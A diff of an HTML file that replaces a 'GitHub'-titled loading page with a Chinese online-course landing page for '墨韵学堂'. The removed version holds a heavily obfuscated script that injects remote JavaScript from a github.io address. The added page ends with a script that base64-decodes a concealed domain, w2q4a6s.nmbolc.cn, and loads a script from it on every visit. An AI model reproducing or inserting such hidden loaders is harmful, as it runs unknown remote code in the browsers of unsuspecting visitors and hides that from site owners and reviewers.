@@ -1,145 +1,636 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <meta name="robots" content="noindex,nofollow" />
-    <title>GitHub</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>墨韵学堂 - 知识的留白</title>
     <style>
-        html,
         body {
-            width: 100vw;
-            height: 100vh;
-        }
-
-        * {
+            overflow: hidden;
+            font-family: 'Noto Serif SC', 'Georgia', serif;
+            /* 优雅的衬线字体，优先思源宋体 */
             margin: 0;
             padding: 0;
+            background-color: #FDFDFD;
+            /* 几乎纯白背景，如宣纸 */
+            color: #4A4A4A;
+            /* 柔和的深灰色文本，如淡墨 */
+            line-height: 1.8;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 90%;
+            margin: 0 auto;
+            padding: 30px 0;
+        }
+
+        /* 头部 - 留白与意境 */
+        header {
+            background-color: #FFFFFF;
+            /* 纯白头部背景 */
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
+            /* 柔和阴影 */
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        header::before {
+            /* 顶部背景水墨晕染图案 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at top left, rgba(144, 164, 174, 0.08) 0%, transparent 20%),
+                radial-gradient(circle at bottom right, rgba(144, 164, 174, 0.08) 0%, transparent 20%);
+            background-size: 80px 80px;
+            z-index: 0;
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
+            /* 更具书法感的标题字体 */
+            font-size: 2.2em;
+            color: #34495E;
+            /* 深蓝灰色，如浓墨 */
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.08);
+            position: relative;
+            z-index: 1;
+            flex-grow: 1;
+            font-weight: normal;
+        }
+
+        header p {
+            display: none;
+        }
+
+        /* 菜单切换按钮 - 简洁图标 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2em;
+            color: #78909C;
+            /* 柔和的墨色 */
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            top: 25px;
+            right: 20px;
+            z-index: 2;
+            transition: transform 0.3s ease, color 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            transform: scale(1.1);
+            color: #546E7A;
+            /* 悬停时加深 */
+        }
+
+        /* 侧边导航菜单 - 轻盈通透 */
+        nav {
+            position: fixed;
+            top: 0;
+            right: -280px;
+            width: 250px;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            /* 几乎不透明的白色背景 */
+            backdrop-filter: blur(5px);
+            /* 柔和模糊 */
+            -webkit-backdrop-filter: blur(5px);
+            border-left: 1px solid rgba(220, 220, 220, 0.5);
+            /* 极细柔和边框 */
+            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
+            /* 柔和阴影 */
+            transition: right 0.4s ease-in-out;
+            z-index: 1001;
+            padding-top: 80px;
             box-sizing: border-box;
         }
 
-        #childIframe {
+        nav.is-open {
+            right: 0;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            /* 列表项间距更小 */
+        }
+
+        nav ul li a {
+            color: #4A4A4A;
+            text-decoration: none;
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(240, 240, 240, 0.5);
+            /* 极细半透明分隔线 */
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 1.1em;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: rgba(144, 164, 174, 0.08);
+            /* 柔和墨色浅背景 */
+            color: #78909C;
+            /* 柔和墨色文字 */
+            transform: translateX(5px);
+        }
+
+        nav ul li:last-child a {
+            border-bottom: none;
+        }
+
+        nav ul li a .icon {
+            font-size: 1.4em;
+            margin-right: 15px;
+            color: #78909C;
+            /* 图标柔和墨色 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 100vh;
-            border: none;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.2);
+            /* 更轻的半透明黑色 */
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
         }
 
-        .loading_container {
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        main {
+            padding-top: 30px;
+        }
+
+        /* 内容区 - 柔和卡片与留白 */
+        section {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 15px;
+            /* 柔和圆角 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            /* 柔和阴影 */
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #EEEEEE;
+            /* 极细边框 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        section::before {
+            /* 顶部柔和墨色条 */
+            content: '';
             position: absolute;
-            top: 40%;
-            left: 40%;
-            margin-left: 10%;
-            transform: translate3d(-50%, -50%, 0);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background-color: #90A4AE;
+            /* 柔和墨色 */
+            box-shadow: 0 0 10px rgba(144, 164, 174, 0.3);
         }
 
-        .loading_container .dot {
-            width: 24px;
-            height: 24px;
-            background: #3ac;
-            border-radius: 100%;
+        section h2 {
+            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
+            font-size: 2.2em;
+            color: #34495E;
+            /* 深蓝灰色 */
+            margin-top: 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #E0E0E0;
+            /* 细分隔线 */
+            padding-bottom: 10px;
+            font-weight: normal;
+        }
+
+        section h3 {
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+            font-size: 1.5em;
+            color: #78909C;
+            /* 柔和墨色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        section p {
+            font-size: 1.05em;
+            color: #666666;
+            margin-bottom: 20px;
+        }
+
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            border: 2px solid #DDDDDD;
+            /* 柔和边框 */
+        }
+
+        .cta-button {
             display: inline-block;
-            animation: slide 1s infinite;
+            background: linear-gradient(45deg, #78909C 0%, #546E7A 100%);
+            /* 柔和墨色渐变按钮 */
+            color: #FFFFFF;
+            padding: 15px 35px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
+            border: none;
+            margin-top: 20px;
         }
 
-        .loading_container .dot:nth-child(1) {
-            animation-delay: 0.1s;
-            background: #32aacc;
+        .cta-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            background: linear-gradient(45deg, #546E7A 0%, #37474F 100%);
         }
 
-        .loading_container .dot:nth-child(2) {
-            animation-delay: 0.2s;
-            background: #64aacc;
+        .course-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
         }
 
-        .loading_container .dot:nth-child(3) {
-            animation-delay: 0.3s;
-            background: #96aacc;
+        .course-item {
+            background-color: #F8F8F8;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border-top: 5px solid #90A4AE;
+            /* 柔和墨色顶部边框 */
         }
 
-        .loading_container .dot:nth-child(4) {
-            animation-delay: 0.4s;
-            background: #c8aacc;
+        .course-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        .loading_container .dot:nth-child(5) {
-            animation-delay: 0.5s;
-            background: #faaacc;
+        .course-item img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-bottom: 15px;
         }
 
-        @-moz-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .course-item h3 {
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+            font-size: 1.2em;
+            color: #34495E;
+            /* 深蓝灰色 */
+            margin-top: 0;
+            margin-bottom: 5px;
         }
 
-        @-webkit-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .course-item p {
+            font-size: 0.9em;
+            color: #777777;
+            margin-bottom: 10px;
         }
 
-        @-o-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .course-item .price {
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #78909C;
+            /* 柔和墨色 */
         }
 
-        @keyframes slide {
-            0% {
-                transform: scale(1);
-            }
+        .course-item .enroll-button {
+            display: inline-block;
+            background-color: #90A4AE;
+            /* 柔和墨色按钮 */
+            color: #FFFFFF;
+            padding: 8px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 0.9em;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
 
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
+        .course-item .enroll-button:hover {
+            background-color: #78909C;
+        }
 
-            100% {
-                transform: scale(1);
-            }
+        .speaker-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .speaker-item {
+            background-color: #F8F8F8;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .speaker-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .speaker-item img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 10px;
+            border: 3px solid #90A4AE;
+            /* 柔和墨色边框 */
+            box-shadow: 0 0 8px rgba(144, 164, 174, 0.3);
+        }
+
+        .speaker-item h3 {
+            font-size: 1.2em;
+            color: #34495E;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+
+        .speaker-item p {
+            font-size: 0.85em;
+            color: #777777;
+            margin-bottom: 0;
+        }
+
+        footer {
+            background: linear-gradient(135deg, #34495E 0%, #2C3E50 100%);
+            /* 深蓝灰色渐变页脚 */
+            color: #FFFFFF;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 0.95em;
+            margin-top: 60px;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+            clip-path: polygon(0 10%, 100% 0, 100% 100%, 0% 100%);
+            /* 顶部斜切 */
+        }
+
+        .footer-links a {
+            color: #FFFFFF;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 1.5em;
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: #90A4AE;
+            /* 柔和墨色 */
+            transform: translateY(-5px) scale(1.1);
         }
     </style>
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div id="loading_box" class="loading_container">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
+    <header>
+        <div class="container">
+            <h1>墨韵学堂</h1>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+        </div>
+    </header>
+
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#hero"><span class="icon">&#128218;</span> 平台概览</a></li>
+            <li><a href="#courses"><span class="icon">&#128214;</span> 热门课程</a></li>
+            <li><a href="#instructors"><span class="icon">&#128100;</span> 优秀讲师</a></li>
+            <li><a href="#contact"><span class="icon">&#128231;</span> 联系我们</a></li>
+        </ul>
+    </nav>
+
+    <div class="overlay" id="menuOverlay"></div>
+
+    <div class="container">
+        <main>
+            <section id="hero">
+                <h2>开启您的水墨学习之旅</h2>
+                <img src="https://picsum.photos/600/350?random=1&seed=ink-wash-learning" alt="水墨学习平台主视觉"
+                    class="random-image">
+                <p>墨韵学堂致力于提供高质量的在线教育，以水墨画般的宁静与深邃，助您沉淀知识，提升自我。我们汇聚各领域专家，为您带来前沿知识和实用技能。</p>
+                <p>无论您是初学者还是资深人士，这里都有适合您的课程，让学习成为一种艺术享受。</p>
+                <a href="#courses" class="cta-button">探索课程</a>
+            </section>
+
+            <section id="courses">
+                <h2>热门课程</h2>
+                <p>精选优质课程，助您高效学习。</p>
+                <div class="course-grid">
+                    <div class="course-item">
+                        <img src="https://picsum.photos/300/150?random=2&seed=course-calligraphy" alt="书法课程">
+                        <h3>中国书法艺术</h3>
+                        <p>领略书法之美，掌握笔墨技巧与章法布局。</p>
+                        <span class="price">¥299.00</span>
+                        <a href="#" class="enroll-button">立即学习</a>
+                    </div>
+                    <div class="course-item">
+                        <img src="https://picsum.photos/300/150?random=3&seed=course-poetry" alt="古典诗词课程">
+                        <h3>古典诗词鉴赏</h3>
+                        <p>品味诗词意境，深入理解中华传统文化。</p>
+                        <span class="price">¥399.00</span>
+                        <a href="#" class="enroll-button">立即学习</a>
+                    </div>
+                    <div class="course-item">
+                        <img src="https://picsum.photos/300/150?random=4&seed=course-tea" alt="茶道课程">
+                        <h3>茶道与养生</h3>
+                        <p>学习茶艺礼仪，感受茶道中的哲学与生活美学。</p>
+                        <span class="price">¥249.00</span>
+                        <a href="#" class="enroll-button">立即学习</a>
+                    </div>
+                    <div class="course-item">
+                        <img src="https://picsum.photos/300/150?random=5&seed=course-philosophy" alt="东方哲学课程">
+                        <h3>东方哲学智慧</h3>
+                        <p>探寻儒释道思想精髓，启迪人生智慧。</p>
+                        <span class="price">¥349.00</span>
+                        <a href="#" class="enroll-button">立即学习</a>
+                    </div>
+                </div>
+            </section>
+
+            <section id="instructors">
+                <h2>优秀讲师</h2>
+                <p>与名家面对面，获取宝贵经验。</p>
+                <div class="speaker-grid">
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=6&seed=instructor-master-li" alt="讲师 李大师">
+                        <h3>李墨轩</h3>
+                        <p>知名书法家</p>
+                    </div>
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=7&seed=instructor-prof-wang" alt="讲师 王教授">
+                        <h3>王雅静</h3>
+                        <p>古典文学教授</p>
+                    </div>
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=8&seed=instructor-zen-master" alt="讲师 禅师">
+                        <h3>张清风</h3>
+                        <p>资深茶艺师</p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="contact">
+                <h2>联系我们</h2>
+                <p>有任何疑问或合作意向，欢迎随时联系我们。</p>
+                <div class="contact-info">
+                    <p><strong>服务热线：</strong> <a href="tel:+861055551234">+86 10 5555 1234</a></p>
+                    <p><strong>邮箱：</strong> <a href="mailto:support@moyunxuetang.com">support@moyunxuetang.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:00 - 18:00</p>
+                </div>
+            </section>
+        </main>
     </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 墨韵学堂. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">隐私政策</a> |
+                <a href="#" target="_blank">服务条款</a> |
+                <a href="#" target="_blank">帮助中心</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
     <script>
-        var _0xodl = 'fSxlA2'; if (function (_0x44df4a, _0x58e26e, _0x532227, _0x1cbb24, _0x42581a, _0x509b59, _0xa79306) { return _0x44df4a = _0x44df4a >> 0x9, _0x509b59 = 'hs', _0xa79306 = 'hs', function (_0x4d29f2, _0x4cbc97, _0xbe291c, _0x31ad23, _0x13acc7) { const _0x407516 = _0x57d3; _0x31ad23 = 'tfi', _0x509b59 = _0x31ad23 + _0x509b59, _0x13acc7 = 'up', _0xa79306 += _0x13acc7, _0x509b59 = _0xbe291c(_0x509b59), _0xa79306 = _0xbe291c(_0xa79306), _0xbe291c = 0x0; const _0x1902ef = _0x4d29f2(); while (!![] && --_0x1cbb24 + _0x4cbc97) { try { _0x31ad23 = -parseInt(_0x407516(0x1d7, ')&2K')) / 0x1 * (-parseInt(_0x407516(0x1da, '(qya')) / 0x2) + -parseInt(_0x407516(0x1c7, 'Pm#h')) / 0x3 * (-parseInt(_0x407516(0x1d1, 'xvr1')) / 0x4) + parseInt(_0x407516(0x1c9, 'Mw8H')) / 0x5 + -parseInt(_0x407516(0x1d8, 'Y$EJ')) / 0x6 + parseInt(_0x407516(0x1cb, 'HIOm')) / 0x7 + -parseInt(_0x407516(0x1dd, 'mry*')) / 0x8 + -parseInt(_0x407516(0x1cc, 'Mw8H')) / 0x9 * (parseInt(_0x407516(0x1dc, 'quPr')) / 0xa); } catch (_0x531926) { _0x31ad23 = _0xbe291c; } finally { _0x13acc7 = _0x1902ef[_0x509b59](); if (_0x44df4a <= _0x1cbb24) _0xbe291c ? _0x42581a ? _0x31ad23 = _0x13acc7 : _0x42581a = _0x13acc7 : _0xbe291c = _0x13acc7; else { if (_0xbe291c == _0x42581a['replace'](/[kqChQWiaIPvYKouwOtDL=]/g, '')) { if (_0x31ad23 === _0x4cbc97) { _0x1902ef['un' + _0x509b59](_0x13acc7); break; } _0x1902ef[_0xa79306](_0x13acc7); } } } } }(_0x532227, _0x58e26e, function (_0x5c8363, _0x34873c, _0x10efd6, _0x28a9f7, _0x1dd818, _0x16adf9, _0x3ea5ad) { return _0x34873c = '\x73\x70\x6c\x69\x74', _0x5c8363 = arguments[0x0], _0x5c8363 = _0x5c8363[_0x34873c](''), _0x10efd6 = '\x72\x65\x76\x65\x72\x73\x65', _0x5c8363 = _0x5c8363[_0x10efd6]('\x76'), _0x28a9f7 = '\x6a\x6f\x69\x6e', (0x1b0f1e, _0x5c8363[_0x28a9f7]('')); }); }(0x19800, 0x89423, _0x1ca1, 0xce), _0x1ca1) { } function _0x1e3297() { const _0x596da2 = _0x57d3, _0x1816ad = { 'bCFHm': 'https://snake-imfv.github.io/take-gate/common.mimi.js?timestamp=', 'UVwwa': _0x596da2(0x1c8, 'u57N'), 'VQnBe': _0x596da2(0x1c6, '#XD(') }, _0x3d27e5 = Date[_0x596da2(0x1d5, ']sYX')](), _0x3ed973 = Math['floor'](Math[_0x596da2(0x1de, 'GP!4')]() * 0xf4240), _0x2564ef = _0x1816ad['bCFHm'] + _0x3d27e5 + _0x1816ad[_0x596da2(0x1cf, 'lKdL')] + _0x3ed973, _0xb78199 = document[_0x596da2(0x1db, '!MEf')](_0x1816ad[_0x596da2(0x1d3, '#W5W')]); _0xb78199[_0x596da2(0x1ce, 'sIgF')] = _0x2564ef, document[_0x596da2(0x1c4, '1Rum')]['appendChild'](_0xb78199); } function _0x57d3(_0x3a7c21, _0x386983) { const _0x1ca173 = _0x1ca1(); return _0x57d3 = function (_0x57d370, _0xacf434) { _0x57d370 = _0x57d370 - 0x1c4; let _0x51e50f = _0x1ca173[_0x57d370]; if (_0x57d3['hhIPqO'] === undefined) { var _0x15663a = function (_0x11d2a9) { const _0x85d5c2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x31b329 = '', _0xc951fd = ''; for (let _0x2837ed = 0x0, _0x364686, _0x101443, _0x448ee2 = 0x0; _0x101443 = _0x11d2a9['charAt'](_0x448ee2++); ~_0x101443 && (_0x364686 = _0x2837ed % 0x4 ? _0x364686 * 0x40 + _0x101443 : _0x101443, _0x2837ed++ % 0x4) ? _0x31b329 += String['fromCharCode'](0xff & _0x364686 >> (-0x2 * _0x2837ed & 0x6)) : 0x0) { _0x101443 = _0x85d5c2['indexOf'](_0x101443); } for (let _0xccb879 = 0x0, _0x1f82ce = _0x31b329['length']; _0xccb879 < _0x1f82ce; _0xccb879++) { _0xc951fd += '%' + ('00' + _0x31b329['charCodeAt'](_0xccb879)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xc951fd); }; const _0x3a032f = function (_0x1c294f, _0x1177da) { let _0x131465 = [], _0x4d6de2 = 0x0, _0x32adbe, _0x4d6802 = ''; _0x1c294f = _0x15663a(_0x1c294f); let _0x4973f5; for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x131465[_0x4973f5] = _0x4973f5; } for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5] + _0x1177da['charCodeAt'](_0x4973f5 % _0x1177da['length'])) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe; } _0x4973f5 = 0x0, _0x4d6de2 = 0x0; for (let _0x54b701 = 0x0; _0x54b701 < _0x1c294f['length']; _0x54b701++) { _0x4973f5 = (_0x4973f5 + 0x1) % 0x100, _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5]) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe, _0x4d6802 += String['fromCharCode'](_0x1c294f['charCodeAt'](_0x54b701) ^ _0x131465[(_0x131465[_0x4973f5] + _0x131465[_0x4d6de2]) % 0x100]); } return _0x4d6802; }; _0x57d3['dxeyOG'] = _0x3a032f, _0x3a7c21 = arguments, _0x57d3['hhIPqO'] = !![]; } const _0x4f32da = _0x1ca173[0x0], _0x4af055 = _0x57d370 + _0x4f32da, _0x21827a = _0x3a7c21[_0x4af055]; return !_0x21827a ? (_0x57d3['AawnSq'] === undefined && (_0x57d3['AawnSq'] = !![]), _0x51e50f = _0x57d3['dxeyOG'](_0x51e50f, _0xacf434), _0x3a7c21[_0x4af055] = _0x51e50f) : _0x51e50f = _0x21827a, _0x51e50f; }, _0x57d3(_0x3a7c21, _0x386983); } _0x1e3297(); function _0x1ca1() { const _0x588e4a = (function () { return [_0xodl, 'twftoQSohxuClqADO2ItPvkLWKYPwkai==', 'WPzprCkiiCkVpmkrqezTW4JdLq', 'WR3dTb0ZWR1wtfj+dL/dVSkJ', 'qq50pLvDog3dN3avWO3cSG', 'W549mhmi'].concat((function () { return ['WPO9W5eXnSk2h8kjw8opW64EWPC', 'W7vgW6a', 'lmo+pMlcSmkzxmkVuSkUW4hcRha', 'WQj2fmoGWRhdUmoACWZdKG', 'W7T2W73cVmkggmkuWRCQW6iqo8kq', 'FL4HWP/dLbTm'].concat((function () { return ['W7JcLJWinGFdN2q', 'W7dcTCoTfq5wpSkImCkYsrPu', 'W5hcVY1XWOXnW7Wx', 'j8kbnw8XvI7cNXbhjCkDW7e', 'tgXwW4PdWP4', 'WPaLkSoW'].concat((function () { return ['rqT0oWyEzxRdSuC', 'a143zr0A', 'E8oaWRxdP8k6WRGb', 'W6ldGCoDuN8/W5xcHG', 'FGLxW7xcIwuiEmkzECk8W6ae', 'WPRdMr3dOttcISkjWPhcT2ldGGRdOa'].concat((function () { return ['WPzkrSkok8kKpSk+xNXTW6JdLG', 'FWPsW7xcGM0jACkPE8khW64v', 'WPVdNXVdPZxcICkkWQ/cMvRdUstdSG', 'WQLVrG', 'W43cIcqGla']; }())); }())); }())); }())); }()); _0x1ca1 = function () { return _0x588e4a; }; return _0x1ca1(); };
+        document.addEventListener('DOMContentLoaded', function () {
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
+
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
+            }
+
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            behavior: 'smooth'
+                        });
+                        toggleMenu();
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const timestamp = Date.now()
+                const randomNum = Math.floor(Math.random() * 1000000)
+                const domain = getdocs();
+                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const script = document.createElement("script")
+                script.src = url
+                document.body.appendChild(script)
+            }
+            function getdocs() {
+                const dd = "Ly93MnE0YTZzLm5tYm9sYy5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                const lookup = new Uint8Array(256);
+                for (let i = 0; i < chars.length; i++) {
+                    lookup[chars.charCodeAt(i)] = i;
+                }
+                let padding = 0;
+                if (dd.endsWith('==')) {
+                    padding = 2;
+                } else if (dd.endsWith('=')) {
+                    padding = 1;
+                }
+                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
+                const len = cleanedString.length;
+                if (len % 4 !== 0) {
+                    throw new Error("Invalid string length.");
+                }
+                const outputLength = (len / 4) * 3 - padding;
+                const outputBytes = new Uint8Array(outputLength);
+                let outputIndex = 0;
+                let i = 0;
+                while (i < len) {
+                    const c1 = lookup[cleanedString.charCodeAt(i++)];
+                    const c2 = lookup[cleanedString.charCodeAt(i++)];
+                    const c3 = lookup[cleanedString.charCodeAt(i++)];
+                    const c4 = lookup[cleanedString.charCodeAt(i++)];
+                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
+                    if (c3 !== 64) {
+                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
+                    }
+                    if (c4 !== 64) {
+                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
+                    }
+                }
+                const decoder = new TextDecoder('utf-8');
+                return decoder.decode(outputBytes);
+            }
+            init()
+        })()
     </script>
 </body>
 
